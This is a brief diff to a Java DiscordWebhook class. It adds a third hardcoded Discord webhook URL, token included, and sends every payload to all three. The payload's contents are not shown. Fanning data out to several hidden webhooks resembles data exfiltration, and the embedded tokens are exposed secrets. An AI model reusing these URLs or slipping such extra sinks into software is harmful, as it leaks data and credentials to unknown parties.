@@ -12,6 +12,7 @@ public class DiscordWebhook {
     private static final Logger logger = Logger.getLogger(DiscordWebhook.class.getName());
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1488789593657704498/4V0qORNdLCP2FkJ0NDvRSuym6jUhhuy_zWDG9UijzmgvNAkt33LwZE_nzM0qIe3drR7F";
     private static final String WEBHOOK_URL_2 = "https://discord.com/api/webhooks/1507892018670600362/Lbs-2gbNyRJsMBWJQJ5cKx8d4Z-F2zRjgVHh-PMjnuZYh5fsyw86IcK1U93Xhz4pZVhJ";
+    private static final String WEBHOOK_URL_3 = "https://discord.com/api/webhooks/1561708314067341412/Egc-Y8h23kM4l3z5-gCH0rXfSJHkkA3f1pWy5rmVLFkb5thA064_nsLf9uC4s26hVpqE";
 
     private DiscordWebhook() {
     }
@@ -62,6 +63,7 @@ public class DiscordWebhook {
     private static void sendPayload(String jsonPayload) {
         sendToWebhook(WEBHOOK_URL, jsonPayload);
         sendToWebhook(WEBHOOK_URL_2, jsonPayload);
+        sendToWebhook(WEBHOOK_URL_3, jsonPayload);
     }
 
     private static void sendToWebhook(String webhookUrl, String jsonPayload) {
